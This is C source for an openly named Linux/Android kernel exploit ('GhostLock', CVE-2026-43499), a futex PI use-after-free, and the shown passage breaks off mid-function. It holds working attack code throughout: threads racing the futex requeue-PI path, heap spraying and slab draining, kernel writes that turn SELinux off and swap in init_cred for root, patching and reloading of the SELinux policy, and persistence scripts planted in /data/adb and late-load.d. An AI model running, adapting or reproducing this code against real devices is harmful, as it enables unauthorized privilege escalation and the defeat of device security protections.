/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <poll.h>
#include <limits.h>

const struct kernel_offsets *active_offsets = NULL;
int force_umh_mode;
static int load_policy_mode;
#define BRIDGE_STATE_DIR "/data/adb/anchor"
#define POLICY_REPAIR_PATH BRIDGE_STATE_DIR "/repair_selinux_policy.sh"
#define POLICY_REPAIR_SOURCE_ENV "ANCHOR_POLICY_REPAIR_SOURCE"

static int fix_selinux_policy_c(const char *stage) {
  int rfd = open("/sys/fs/selinux/policy", O_RDONLY | O_CLOEXEC);
  if (rfd < 0) {
    pr_error("fix_policy_c: open /sys/fs/selinux/policy failed errno=%d\n", errno);
    return -1;
  }
  off_t sz = lseek(rfd, 0, SEEK_END);
  if (sz <= 20) {
    close(rfd);
    pr_error("fix_policy_c: invalid policy size %ld\n", (long)sz);
    return -1;
  }
  lseek(rfd, 0, SEEK_SET);
  uint8_t *buf = malloc(sz);
  if (!buf) {
    close(rfd);
    pr_error("fix_policy_c: malloc %ld bytes failed\n", (long)sz);
    return -1;
  }
  ssize_t rd = read(rfd, buf, sz);
  close(rfd);
  if (rd != sz) {
    free(buf);
    pr_error("fix_policy_c: read failed rd=%zd sz=%zd errno=%d\n", rd, (ssize_t)sz, errno);
    return -1;
  }

  /* Validate SELinux policydb magic (0xf97cff8c in LE) */
  if (buf[0] != 0x8c || buf[1] != 0xff || buf[2] != 0x7c || buf[3] != 0xf9) {
    free(buf);
    pr_error("fix_policy_c: bad magic %02x%02x%02x%02x\n", buf[0], buf[1], buf[2], buf[3]);
    return -1;
  }

  uint32_t id_len = 0;
  memcpy(&id_len, buf + 4, 4);
  if (id_len == 0 || id_len > 256) {
    free(buf);
    pr_error("fix_policy_c: invalid id_len %u\n", id_len);
    return -1;
  }

  size_t config_off = 4 + 4 + id_len + 4;
  if (config_off + 4 > (size_t)sz) {
    free(buf);
    pr_error("fix_policy_c: config_off out of range (%zu > %zu)\n", config_off + 4, (size_t)sz);
    return -1;
  }

  uint32_t original_config = 0;
  memcpy(&original_config, buf + config_off, 4);
  uint32_t fixed_config = original_config | 0xC0000000U;
  memcpy(buf + config_off, &fixed_config, 4);
  pr_info("fix_policy_c: config 0x%08x -> 0x%08x (offset 0x%zx)\n", original_config, fixed_config, config_off);

  /* Single-syscall atomic write to /sys/fs/selinux/load */
  int wfd = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
  if (wfd < 0) {
    free(buf);
    pr_error("fix_policy_c: open /sys/fs/selinux/load failed errno=%d\n", errno);
    return -1;
  }
  ssize_t wr = write(wfd, buf, sz);
  close(wfd);
  free(buf);

  if (wr != sz) {
    pr_error("fix_policy_c: write /sys/fs/selinux/load failed wr=%zd sz=%zd errno=%d\n", wr, (ssize_t)sz, errno);
    return -1;
  }

  pr_success("fix_policy_c: loaded %zd bytes to /sys/fs/selinux/load successfully\n", wr);

  /* Restore enforcing */
  int efd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
  if (efd >= 0) {
    write(efd, "1", 1);
    close(efd);
  }

  /* Atomically write policy-repair.state */
  mkdir("/data/adb", 0700);
  mkdir(BRIDGE_STATE_DIR, 0700);
  chmod(BRIDGE_STATE_DIR, 0700);
  char tmp_state[160];
  snprintf(tmp_state, sizeof(tmp_state), BRIDGE_STATE_DIR "/policy-repair.state.tmp.%ld", (long)getpid());
  int sfd = open(tmp_state, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (sfd >= 0) {
    time_t now = time(NULL);
    struct tm tm_info;
    char time_buf[64] = "unknown";
    if (localtime_r(&now, &tm_info)) {
      strftime(time_buf, sizeof(time_buf), "%Y-%m-%dT%H:%M:%S%z", &tm_info);
    }
    dprintf(sfd,
            "result=success\n"
            "stage=%s\n"
            "original_config=0x%08x\n"
            "fixed_config=0x%08x\n"
            "load_method=c_native_direct_load\n"
            "load_policy_rc=0\n"
            "selinux=Enforcing\n"
            "timestamp=%s\n",
            stage ? stage : "immediate", original_config, fixed_config, time_buf);
    fsync(sfd);
    fchown(sfd, 0, 0);
    fchmod(sfd, 0600);
    close(sfd);
    rename(tmp_state, BRIDGE_STATE_DIR "/policy-repair.state");
  }

  /* Append to run log */
  int lfd = open(BRIDGE_STATE_DIR "/policy-repair.log", O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0600);
  if (lfd >= 0) {
    dprintf(lfd,
            "\n===== policy repair started: stage=%s pid=%ld =====\n"
            "policy repair: config 0x%08x -> 0x%08x (verified)\n"
            "policy repair: successfully loaded via C native direct write to /sys/fs/selinux/load\n"
            "===== policy repair finished: status=0 method=c_native_direct_load =====\n",
            stage ? stage : "immediate", (long)getpid(), original_config, fixed_config);
    fchown(lfd, 0, 0);
    fchmod(lfd, 0600);
    close(lfd);
  }

  return 0;
}

static int run_policy_repair_with_retries(const char *stage) {
  if (getuid() == 0) {
    if (fix_selinux_policy_c(stage) == 0) {
      pr_success("policy repair %s success (c_native)\n", stage);
      return 0;
    }
  }

  for (int attempt = 1; attempt <= 5; ++attempt) {
    pr_info("policy repair %s attempt %d/5\n", stage, attempt);

    char self_exe[PATH_MAX] = "";
    ssize_t self_len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (self_len > 0) {
      self_exe[self_len] = '\0';
      char cmd_native[PATH_MAX + 64];
      snprintf(cmd_native, sizeof(cmd_native), "su -c '\"%s\" --fix-policy %s'", self_exe, stage);
      int native_rc = system(cmd_native);
      if (native_rc == 0) {
        pr_success("policy repair %s success (c_native su)\n", stage);
        return 0;
      }
    }

    char command[192];
    int length = snprintf(command, sizeof(command),
                          "su -c 'ANCHOR_POLICY_REPAIR_STAGE=%s %s'",
                          stage, POLICY_REPAIR_PATH);
    if (length > 0 && (size_t)length < sizeof(command)) {
      int rc = system(command);
      if (rc == 0) {
        pr_success("policy repair %s success (script)\n", stage);
        return 0;
      }
      pr_error("policy repair %s attempt %d/5 failed rc=%d\n", stage, attempt,
               rc);
    }
    if (attempt != 5) sleep(1);
  }
  return -1;
}

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override task/mm layout macros with the selected kernel profile. */
#include "runtime_struct_offsets.h"

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      pr_info("pselect parameters: PSELECT_SHIFT=%s "
              "PSELECT_ROUTE_DELAY_USEC=%s\n",
              getenv("PSELECT_SHIFT") ?: "<unset>",
              getenv("PSELECT_ROUTE_DELAY_USEC") ?: "<unset>");
      g_init_cred_image = INIT_CRED;
      if (active_offsets->kernel_phys_load)
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  while (!atomic_load(&route_done)) usleep(5000);
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  return 1;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) {
        /* The W1 worker can be forcibly timed out.  These temporary drain
         * children must not survive that event and poison every later W1. */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        if (getppid() == 1) _exit(0);
        pause();
        _exit(0);
      }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

/* A failed PI route leaves its owner/consumer threads alive.  Isolate every
 * write attempt so the next attempt starts without those shared futex states.
 * CPH2655 may take nearly 40 seconds to complete a valid route, so do not
 * prematurely kill a healthy worker at the old 20-second boundary. */
#define WRITE_ATTEMPT_TIMEOUT_MSEC 60000

static int run_isolated_write(uintptr_t target, const char *desc, int mode,
                              int attempt, int drain_before_write) {
  pid_t pid = fork();
  if (pid < 0) {
    pr_error("%s attempt %d: fork failed errno=%d\n", desc, attempt, errno);
    return 0;
  }
  if (pid == 0) {
    /* If the launcher is killed by Magica's userspace restart, do not leave
     * an in-progress write worker (and its futex state) behind. */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) _exit(1);
    if (drain_before_write) slab_drain();
    int ran = do_one_write(target, desc, mode);
    _exit(ran ? 0 : 1);
  }

  int status = 0;
  for (int elapsed = 0; elapsed < WRITE_ATTEMPT_TIMEOUT_MSEC; elapsed += 10) {
    pid_t waited = waitpid(pid, &status, WNOHANG);
    if (waited == pid) {
      if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        pr_error("%s attempt %d: worker exited status=%d\n", desc, attempt,
                 status);
        return 0;
      }
      return 1;
    }
    if (waited < 0) {
      pr_error("%s attempt %d: waitpid failed errno=%d\n", desc, attempt,
               errno);
      return 0;
    }
    usleep(10000);
  }

  pr_error("%s attempt %d: timed out; terminating worker\n", desc, attempt);
  kill(pid, SIGKILL);
  waitpid(pid, NULL, 0);
  return 0;
}

static int run_w1_attempt(int attempt) {
  return run_isolated_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1,
                            attempt, 0);
}

/* The bootstrapper keeps only a compact state record under its own root-owned
 * directory.  Temporary scripts and legacy shell-setup files must not survive
 * a completed or failed run in /data/local/tmp. */
#define ROOT_SCRIPT_PATH BRIDGE_STATE_DIR "/bootstrap.sh"
#define UMH_SCRIPT_PATH "/data/local/tmp/.ghostlock_root.sh"
#define LATELOAD_DIR "/data/adb/late-load.d"
#define LATELOAD_RECOVERY_PATH LATELOAD_DIR "/99-anchor-recover.sh"
#define BOOTSTRAP_LOCK_ENV "ANCHOR_BOOTSTRAP_LOCK_DIR"

/* A one-shot late-load recovery runs after KernelSU sepolicy initialization.
 * It uses the same stable repair entry point as the immediate path. */
#define ANCHOR_ENABLE_LATELOAD_RECOVERY 1

static char bootstrap_lock_dir[512];
static char bootstrap_lock_owner[512];

/* PID values can be reused after an app restart.  Keep the kernel process
 * start time with the PID so a new anchor process does not inherit a stale
 * single-flight lock from its predecessor. */
static int read_proc_starttime(pid_t pid, unsigned long long *starttime) {
  char path[64];
  char line[4096];
  int path_len = snprintf(path, sizeof(path), "/proc/%ld/stat", (long)pid);
  if (path_len < 0 || (size_t)path_len >= sizeof(path)) return 0;
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return 0;
  ssize_t length = read(fd, line, sizeof(line) - 1);
  close(fd);
  if (length <= 0) return 0;
  line[length] = '\0';

  /* comm is parenthesized and may itself contain spaces or ')'. */
  char *comm_end = strrchr(line, ')');
  if (!comm_end || comm_end[1] != ' ') return 0;
  char *save = NULL;
  char *token = strtok_r(comm_end + 2, " ", &save);
  for (int field = 3; token && field <= 22; ++field) {
    if (field == 22) {
      char *end = NULL;
      unsigned long long value = strtoull(token, &end, 10);
      if (end == token || *end != '\0') return 0;
      *starttime = value;
      return 1;
    }
    token = strtok_r(NULL, " ", &save);
  }
  return 0;
}

static void prepare_bridge_state_dir(void) {
  mkdir("/data/adb", 0700);
  mkdir(BRIDGE_STATE_DIR, 0700);
  chmod(BRIDGE_STATE_DIR, 0700);
}

static void write_bridge_state(const char *value) {
  prepare_bridge_state_dir();
  int fd = open(BRIDGE_STATE_DIR "/bootstrap.state",
                O_WRONLY | O_CREAT | O_TRUNC, 0600);
  if (fd < 0) return;
  dprintf(fd, "result=%s\n", value);
  close(fd);
  chmod(BRIDGE_STATE_DIR "/bootstrap.state", 0600);
}

static void write_policy_repair_disabled_state(void) {
  prepare_bridge_state_dir();
  char tmp[160];
  snprintf(tmp, sizeof(tmp), BRIDGE_STATE_DIR "/policy-repair.state.tmp.%ld",
           (long)getpid());
  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) return;
  dprintf(fd, "result=disabled\nstage=disabled\nselinux=unknown\n");
  if (fsync(fd) == 0 && fchown(fd, 0, 0) == 0 && fchmod(fd, 0600) == 0 &&
      close(fd) == 0)
    rename(tmp, BRIDGE_STATE_DIR "/policy-repair.state");
  else {
    close(fd);
    unlink(tmp);
  }
}

static void cleanup_tmp_compat_files(void) {
  unlink("/data/local/tmp/.ghostlock_root.sh");
  unlink("/data/local/tmp/.ghostlock_w1");
  unlink("/data/local/tmp/a/ghostlock_postroot.log");
  unlink("/data/local/tmp/a/adbkey");
  unlink("/data/local/tmp/a/adbkey.pub");
  unlink("/data/local/tmp/a/e");
}

/* BOOT_COMPLETED and manual retries can overlap. The app supplies an
 * app-private parent directory because this code runs as untrusted_app until
 * the credential transition; /data/adb must only be touched after root. */
static int prepare_bootstrap_lock_paths(void) {
  const char *parent = getenv(BOOTSTRAP_LOCK_ENV);
  if (!parent || parent[0] != '/') {
    pr_error("bootstrap lock directory is unavailable\n");
    return 0;
  }
  int dir_length = snprintf(bootstrap_lock_dir, sizeof(bootstrap_lock_dir),
                            "%s/bootstrap.lock", parent);
  int owner_length = snprintf(bootstrap_lock_owner,
                              sizeof(bootstrap_lock_owner), "%s/owner",
                              bootstrap_lock_dir);
  if (dir_length < 0 || (size_t)dir_length >= sizeof(bootstrap_lock_dir) ||
      owner_length < 0 || (size_t)owner_length >= sizeof(bootstrap_lock_owner)) {
    pr_error("bootstrap lock path is too long\n");
    return 0;
  }
  return 1;
}

/* A directory is an atomic single-flight lock. The owner PID lets a
 * post-restart invocation reclaim a dead owner's lock immediately; the age
 * fallback handles a torn owner file. */
static int create_bootstrap_lock(void) {
  if (mkdir(bootstrap_lock_dir, 0700) != 0) return 0;
  int fd = open(bootstrap_lock_owner, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                0600);
  if (fd < 0) {
    rmdir(bootstrap_lock_dir);
    return 0;
  }
  unsigned long long starttime = 0;
  if (!read_proc_starttime(getpid(), &starttime)) {
    close(fd);
    unlink(bootstrap_lock_owner);
    rmdir(bootstrap_lock_dir);
    return 0;
  }
  dprintf(fd, "%ld %llu\n", (long)getpid(), starttime);
  close(fd);
  return 1;
}

static int acquire_bootstrap_lock(void) {
  if (!prepare_bootstrap_lock_paths()) return 0;
  if (create_bootstrap_lock()) return 1;
  if (errno != EEXIST) {
    pr_error("cannot acquire bootstrap lock errno=%d\n", errno);
    return 0;
  }

  char owner[32] = {0};
  read_first_line(bootstrap_lock_owner, owner, sizeof(owner));
  long owner_pid = 0;
  unsigned long long owner_starttime = 0;
  int owner_fields = sscanf(owner, "%ld %llu", &owner_pid, &owner_starttime);
  int owner_is_stale = 0;
  if (owner_pid > 0 && owner_starttime > 0) {
    unsigned long long current_starttime = 0;
    owner_is_stale = !read_proc_starttime((pid_t)owner_pid, &current_starttime) ||
                     current_starttime != owner_starttime;
  } else if (owner_pid == (long)getpid()) {
    /* Legacy owner files contained only a PID.  This process cannot already
     * own the lock before acquire_bootstrap_lock() succeeds, so a matching
     * PID is necessarily a reused PID from a previous invocation. */
    owner_is_stale = 1;
  }
  if (owner_fields > 0 && owner_pid > 0 &&
      (owner_is_stale || (kill((pid_t)owner_pid, 0) != 0 && errno == ESRCH))) {
    unlink(bootstrap_lock_owner);
    if (rmdir(bootstrap_lock_dir) == 0 && create_bootstrap_lock()) {
      pr_info("reclaimed stale bootstrap lock pid=%ld\n", owner_pid);
      return 1;
    }
  }

  struct stat st;
  time_t now = time(NULL);
  /* A torn owner write (for example after a device reset) cannot identify a
   * live process.  Give a just-created lock a short grace period, then
   * reclaim malformed owner state instead of blocking every future retry. */
  if (owner_fields <= 0 && stat(bootstrap_lock_dir, &st) == 0 &&
      now != (time_t)-1 && now - st.st_mtime > 10) {
    unlink(bootstrap_lock_owner);
    if (rmdir(bootstrap_lock_dir) == 0 && create_bootstrap_lock()) {
      pr_info("reclaimed malformed bootstrap lock\n");
      return 1;
    }
  }
  if (stat(bootstrap_lock_dir, &st) == 0 && now != (time_t)-1 &&
      now - st.st_mtime > 300) {
    unlink(bootstrap_lock_owner);
    if (rmdir(bootstrap_lock_dir) == 0 && create_bootstrap_lock()) {
      pr_info("reclaimed stale bootstrap lock\n");
      return 1;
    }
  }
  pr_info("bootstrap already running; lock=%s\n", bootstrap_lock_dir);
  return 0;
}

static void release_bootstrap_lock(void) {
  unlink(bootstrap_lock_owner);
  if (rmdir(bootstrap_lock_dir) != 0 && errno != ENOENT)
    pr_error("cannot release bootstrap lock errno=%d\n", errno);
}

/* Publish scripts with rename(2), so ksud can never observe a truncated
 * late-load handoff after a retry or a userspace restart. */
static int publish_root_script(const char *path, const char *script) {
  char tmp[160];
  snprintf(tmp, sizeof(tmp), "%s.tmp.%ld", path, (long)getpid());
  unlink(tmp);

  int fd = open(tmp, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
  if (fd < 0) return 0;

  size_t length = strlen(script);
  size_t written = 0;
  while (written < length) {
    ssize_t rc = write(fd, script + written, length - written);
    if (rc > 0) {
      written += (size_t)rc;
      continue;
    }
    if (rc < 0 && errno == EINTR) continue;
    close(fd);
    unlink(tmp);
    return 0;
  }
  if (fsync(fd) != 0 || close(fd) != 0 || chmod(tmp, 0700) != 0 ||
      rename(tmp, path) != 0) {
    unlink(tmp);
    return 0;
  }
  return 1;
}

/* The app-private asset is only a first-deployment source.  After the
 * credential transition, publish the stable root-owned copy atomically so a
 * late-load process can never observe a partial script or depend on the app
 * sandbox surviving userspace changes. */
static int deploy_policy_repair_script(void) {
  const char *source = getenv(POLICY_REPAIR_SOURCE_ENV);
  if (!source || source[0] != '/') {
    pr_error("policy repair deployment source is unavailable\n");
    return 0;
  }
  int input = open(source, O_RDONLY | O_CLOEXEC);
  if (input < 0) {
    pr_error("cannot open policy repair deployment source errno=%d\n", errno);
    return 0;
  }
  prepare_bridge_state_dir();
  char tmp[160];
  int length = snprintf(tmp, sizeof(tmp), "%s.tmp.%ld", POLICY_REPAIR_PATH,
                        (long)getpid());
  if (length < 0 || (size_t)length >= sizeof(tmp)) { close(input); return 0; }
  unlink(tmp);
  int output = open(tmp, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0700);
  if (output < 0) { close(input); return 0; }
  char buffer[4096];
  int ok = 1;
  for (;;) {
    ssize_t got = read(input, buffer, sizeof(buffer));
    if (got == 0) break;
    if (got < 0) { if (errno == EINTR) continue; ok = 0; break; }
    for (ssize_t off = 0; off < got;) {
      ssize_t put = write(output, buffer + off, (size_t)(got - off));
      if (put > 0) { off += put; continue; }
      if (put < 0 && errno == EINTR) continue;
      ok = 0; break;
    }
    if (!ok) break;
  }
  close(input);
  if (!ok || fsync(output) != 0 || fchown(output, 0, 0) != 0 ||
      fchmod(output, 0700) != 0 || close(output) != 0 ||
      rename(tmp, POLICY_REPAIR_PATH) != 0) {
    close(output);
    unlink(tmp);
    pr_error("cannot publish policy repair script errno=%d\n", errno);
    return 0;
  }
  chown(BRIDGE_STATE_DIR, 0, 0);
  chmod(BRIDGE_STATE_DIR, 0700);
  /* A new bootstrap run must not inherit a previous successful repair state.
   * The late-load script uses this state to avoid running twice within the
   * same handoff, so clear it before publishing the new repair script. */
  unlink(BRIDGE_STATE_DIR "/policy-repair.state");
  pr_success("policy repair script deployed\n");
  return 1;
}

/* `late-load` deliberately changes the process environment and Magica may also
 * restart user space.  Do not put essential post-root work in the shell which
 * starts it: that shell can disappear mid-flight.  ksud runs every executable
 * in /data/adb/late-load.d synchronously after it has loaded KernelSU and its
 * sepolicy rules, but before it applies the dynamic-manager configuration.
 * Install a one-shot handoff there while the W2 child is root. */
#if ANCHOR_ENABLE_LATELOAD_RECOVERY
static int write_lateload_recovery_script(void) {
  const char *dir = LATELOAD_DIR;
  const char *path = LATELOAD_RECOVERY_PATH;
  prepare_bridge_state_dir();
  if (mkdir(dir, 0755) != 0 && errno != EEXIST) {
